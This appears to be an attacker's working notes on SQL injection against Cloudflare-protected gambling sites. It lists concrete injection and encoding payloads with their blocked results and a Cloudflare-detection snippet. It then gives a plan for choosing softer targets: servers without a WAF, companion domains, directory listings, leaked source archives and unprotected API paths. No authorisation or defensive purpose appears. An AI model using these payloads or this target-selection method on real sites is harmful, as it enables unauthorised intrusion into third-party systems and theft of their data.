# Cloudflare WAF Bypass — Tested Techniques (2026-06)

## TL;DR
Cloudflare WAF (as deployed on gambling sites) blocks ALL standard SQLi bypass techniques. Don't waste time on WAF bypass — instead find targets WITHOUT Cloudflare.

## Tested Techniques (ALL FAILED)

### Form-Based SQLi
```
admin'--                    → BLOCKED (InvalidRequest)
admin' OR '1'='1'--         → BLOCKED
admin'/**/OR/**/1=1--       → BLOCKED
admin'/*!50000UNION*/--     → BLOCKED
admin'OR'1'='1'--           → BLOCKED
```

### Encoding Bypass
```
admin%27--                  → BLOCKED (URL encoded)
admin%2527--                → BLOCKED (double encoded)
admin\u0027--               → BLOCKED (unicode)
admin＇--                   → BLOCKED (fullwidth)
admin%C0%27--               → BLOCKED (overlong)
```

### Content-Type Bypass
```
JSON body                   → BLOCKED
Multipart form              → BLOCKED
XML body                    → BLOCKED (or 405)
```

### Parameter Injection
```
Cookie injection            → BLOCKED
Header injection (Referer)  → BLOCKED
X-Forwarded-For             → 403 (not InvalidRequest, but still blocked)
HPP (duplicate params)      → BLOCKED
```

### Time-Based
```
WAITFOR DELAY               → BLOCKED (0.10s response)
SLEEP()                     → BLOCKED (0.09s response)
```

### Other
```
Nested JSON objects         → BLOCKED
Case variation (Admin)      → BLOCKED
Tab/newline in payload      → BLOCKED
```

## What Works Instead
1. **Find targets without Cloudflare** — Use Server header check
2. **Companion domains** — Often not behind Cloudflare
3. **Directory listings** — Cloudflare doesn't block directory listing access
4. **Source code leaks** — .zip files on companion domains
5. **API endpoints** — Some API paths may not be protected by WAF

## Cloudflare Detection
```python
server = r.headers.get('Server', '').lower()
is_cf = 'cloudflare' in server
# Also check: cf-ray header, cf-cache-status
```

## Alternative: Target Selection
Instead of bypassing WAF, focus on:
- LiteSpeed servers (no WAF)
- Apache servers (no WAF)
- nginx servers (no WAF)
- OpenResty servers (no WAF)
- Companion/related domains (often unprotected)
